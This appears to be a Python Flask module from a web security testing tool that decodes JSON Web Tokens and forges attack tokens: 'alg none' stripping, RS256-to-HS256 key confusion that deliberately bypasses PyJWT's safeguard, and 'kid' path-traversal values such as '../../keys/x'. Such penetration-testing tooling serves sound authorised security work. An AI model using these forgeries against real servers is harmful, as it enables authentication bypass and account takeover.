"""JWT workbench — decode, sign, alg-switch, key-confusion, kid traversal."""
from __future__ import annotations

import base64
import contextlib
import hashlib
import hmac
import json
import time
from typing import Any
from urllib.parse import urlsplit

import jwt as pyjwt
from flask import Blueprint, g, redirect, render_template, request, url_for

from ...a11y import summarise_jwt
from ...engines import Request, httpx_engine
from ...jwk_resolver import resolve_public_key
from .._prg import PRGCache

bp = Blueprint("jwt", __name__)

_cache = PRGCache()


HS_ALGS = ["HS256", "HS384", "HS512"]
RS_ALGS = ["RS256", "RS384", "RS512"]
ES_ALGS = ["ES256", "ES384", "ES512"]
ALL_ALGS = HS_ALGS + RS_ALGS + ES_ALGS + ["none"]

# Smart-key-input fetch: capped, redirect-disabled, short timeout.
# Kept small and predictable so a JWKS URL cannot be used to hang the
# worker or exfiltrate large blobs.
_JWKS_FETCH_TIMEOUT_SEC = 10.0


_EMPTY_FORM = {
    "token": "", "header_text": "", "payload_text": "",
    "alg": "HS256", "secret": "",
    "private_key": "", "public_key": "",
    "kid_values": "kid1\nkey-1\n../../keys/x\n/dev/null",
}
_EMPTY_OUT: dict[str, Any] = {
    "decoded": None, "summary": "", "signed": "",
    "alg_none": "", "key_confusion": "", "key_source": "",
    "kid_set": [], "error": "",
}


def _render_raw_get(url: str, extra_headers: list[tuple[str, str]]) -> bytes:
    """Best-effort raw-bytes rendering of the outbound JWKS GET for history."""
    parts = urlsplit(url)
    path = parts.path or "/"
    if parts.query:
        path += "?" + parts.query
    host = parts.hostname or ""
    if parts.port:
        host = f"{host}:{parts.port}"
    head = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
    head += "".join(f"{k}: {v}\r\n" for k, v in extra_headers) + "\r\n"
    return head.encode("latin-1", errors="replace")


def _render_raw_response(resp) -> bytes:
    head = f"HTTP/{resp.http_version} {resp.status} {resp.reason}\r\n"
    head += "".join(f"{k}: {v}\r\n" for k, v in resp.headers) + "\r\n"
    return head.encode("latin-1", errors="replace") + (resp.body or b"")


def _make_jwks_fetcher():
    """Return a fetcher closure suitable for jwk_resolver.resolve_public_key.

    Uses the standard httpx engine so the request is byte-for-byte the
    same as any other Reqlore HTTP call; logs into http_history so the
    tester always sees the outbound fetch; disables redirects and caps
    the timeout so a malicious JWKS URL can't hang the worker or bounce
    us into an unapproved scheme/host.
    """
    project = g.project

    def fetch(url: str) -> bytes:
        headers = [
            ("User-Agent", "Reqlore-JWT-Workbench/1.0"),
            ("Accept", "application/json, application/jwk-set+json, */*;q=0.1"),
        ]
        req = Request(method="GET", url=url, headers=headers)
        t0 = time.monotonic()
        # follow_redirects=False keeps the resolver in control of the
        # scheme allow-list; verify=False matches Reqlore's other
        # workbenches which routinely hit dev / self-signed hosts.
        resp = httpx_engine.send(
            req, follow_redirects=False, verify=False,
            timeout=_JWKS_FETCH_TIMEOUT_SEC,
        )
        duration_ms = int((time.monotonic() - t0) * 1000)
        try:
            host = urlsplit(url).hostname or ""
        except Exception:  # noqa: BLE001 - never fail the fetch over host parsing
            host = ""
        # Log the fetch to history unconditionally (success or engine
        # error) so the tester has an audit trail; history is best-effort.
        with contextlib.suppress(Exception):
            project.add_history(
                host=host, method="GET", url=url,
                status=resp.status, duration_ms=resp.timings.total_ms or duration_ms,
                engine="jwt/jwks-fetch",
                raw_req=_render_raw_get(url, headers),
                raw_resp=_render_raw_response(resp),
            )
        if resp.error:
            raise ValueError(f"Fetch failed: {resp.error}")
        if resp.status < 200 or resp.status >= 300:
            raise ValueError(f"JWKS URL returned HTTP {resp.status}.")
        return resp.body or b""

    return fetch


def _b64url_decode(s: str) -> bytes:
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).decode("ascii").rstrip("=")


def _decode_unverified(token: str) -> tuple[dict, dict, str, str | None]:
    """Returns (header, payload, signature_b64, error)."""
    try:
        parts = token.strip().split(".")
        if len(parts) < 2:
            return {}, {}, "", "Not a JWT (need at least 2 dots)."
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        sig = parts[2] if len(parts) > 2 else ""
        return header, payload, sig, None
    except Exception as e:
        return {}, {}, "", f"{type(e).__name__}: {e}"


def _forge_hs256_with_key(header: dict, payload: dict, secret_bytes: bytes) -> str:
    """RS->HS key confusion: sign header.payload with HS256 using arbitrary bytes.

    PyJWT (>=2.4) refuses to accept an asymmetric key as an HMAC secret,
    which is exactly what a vulnerable server does when it picks the
    verifier by the token's ``alg`` header. This helper reproduces that
    exact operation manually so the workbench can produce a token the
    vulnerable server will accept.
    """
    h = dict(header)
    h["alg"] = "HS256"
    header_b64 = _b64url_encode(json.dumps(h, separators=(",", ":")).encode("utf-8"))
    payload_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    signing_input = f"{header_b64}.{payload_b64}".encode("ascii")
    sig = hmac.new(secret_bytes, signing_input, hashlib.sha256).digest()
    return f"{header_b64}.{payload_b64}.{_b64url_encode(sig)}"


@bp.route("/", methods=["GET", "POST"])
def index():
    if request.method == "GET":
        stashed = _cache.get(request.args.get("t"))
        if stashed:
            return render_template("jwt/index.html",
                                    form=stashed["form"], out=stashed["out"],
                                    algs=ALL_ALGS)
        form = dict(_EMPTY_FORM)
        # Pre-fill token from GET param when arriving via "Send to JWT".
        tok = request.args.get("token", "")
        if tok:
            form["token"] = tok
        return render_template("jwt/index.html", form=form,
                                out=dict(_EMPTY_OUT), algs=ALL_ALGS)

    # POST — do the work, stash, redirect.
    form = dict(_EMPTY_FORM)
    for k in form:
        if k in request.form:
            form[k] = request.form[k]
    out = dict(_EMPTY_OUT)
    out["kid_set"] = []
    action = request.form.get("action", "decode")

    if action == "decode":
        h, p, sig, err = _decode_unverified(form["token"])
        if err:
            out["error"] = err
        else:
            out["decoded"] = {"header": h, "payload": p, "signature": sig}
            out["summary"] = summarise_jwt(h, p)
            form["header_text"] = json.dumps(h, indent=2)
            form["payload_text"] = json.dumps(p, indent=2)

    elif action == "sign":
        try:
            hdr = json.loads(form["header_text"] or "{}")
            pl = json.loads(form["payload_text"] or "{}")
            alg = form["alg"] or "HS256"
            hdr["alg"] = alg
            if alg == "none":
                enc = _b64url_encode(json.dumps(hdr, separators=(",", ":")).encode())
                enc2 = _b64url_encode(json.dumps(pl, separators=(",", ":")).encode())
                out["signed"] = f"{enc}.{enc2}."
            else:
                key = form["private_key"] if alg.startswith(("RS", "ES")) else form["secret"]
                if not key:
                    out["error"] = "Missing key/secret."
                else:
                    out["signed"] = pyjwt.encode(pl, key, algorithm=alg, headers=hdr)
        except Exception as e:
            out["error"] = f"{type(e).__name__}: {e}"

    elif action == "alg_none":
        h, p, _sig, err = _decode_unverified(form["token"])
        if err:
            out["error"] = err
        else:
            h["alg"] = "none"
            enc = _b64url_encode(json.dumps(h, separators=(",", ":")).encode())
            enc2 = _b64url_encode(json.dumps(p, separators=(",", ":")).encode())
            out["alg_none"] = f"{enc}.{enc2}."

    elif action == "key_confusion":
        # RS256 -> HS256 trick: sign with the server's public key as if it were HMAC secret.
        # The public_key field is a "smart" input -- PEM (unchanged),
        # single JWK, full JWKS document, or JWKS URL -- resolved by
        # jwk_resolver into an SPKI PEM string before we sign.
        #
        # We deliberately bypass pyjwt.encode() for this action: PyJWT
        # >= 2.4 refuses to use an asymmetric key as an HMAC secret
        # (raises InvalidKeyError -- a defensive block against exactly
        # this footgun in normal apps). For our workbench that block
        # would prevent the tester from reproducing the exact attack
        # the vulnerable server performs; a vulnerable server does the
        # HMAC directly with the PEM bytes, so we do the same.
        h, p, _sig, err = _decode_unverified(form["token"])
        if err:
            out["error"] = err
        elif not (form["public_key"] or "").strip():
            out["error"] = (
                "Need the server's public key to forge HS256-of-pubkey. "
                "Paste a PEM, a JWK, a JWKS document, or a https://.../jwks.json URL."
            )
        else:
            try:
                pem, source = resolve_public_key(
                    form["public_key"],
                    kid=h.get("kid") if isinstance(h, dict) else None,
                    fetcher=_make_jwks_fetcher(),
                )
            except ValueError as e:
                out["error"] = f"Public key: {e}"
            else:
                try:
                    forged = _forge_hs256_with_key(h, p, pem.encode("utf-8"))
                    out["key_confusion"] = forged
                    out["key_source"] = source
                except Exception as e:  # noqa: BLE001
                    out["error"] = f"{type(e).__name__}: {e}"

    elif action == "kid_traversal":
        h, p, _sig, err = _decode_unverified(form["token"])
        if err:
            out["error"] = err
        else:
            values = [v for v in (form["kid_values"] or "").splitlines() if v.strip()]
            produced: list[tuple[str, str]] = []
            for kid in values:
                h2 = dict(h)
                h2["kid"] = kid
                h2["alg"] = "HS256"
                try:
                    tok = pyjwt.encode(p, form["secret"] or "secret", algorithm="HS256", headers=h2)
                    produced.append((kid, tok))
                except Exception as e:
                    produced.append((kid, f"<error: {e}>"))
            out["kid_set"] = produced

    token = _cache.put({"form": form, "out": out})
    return redirect(url_for(".index", t=token))
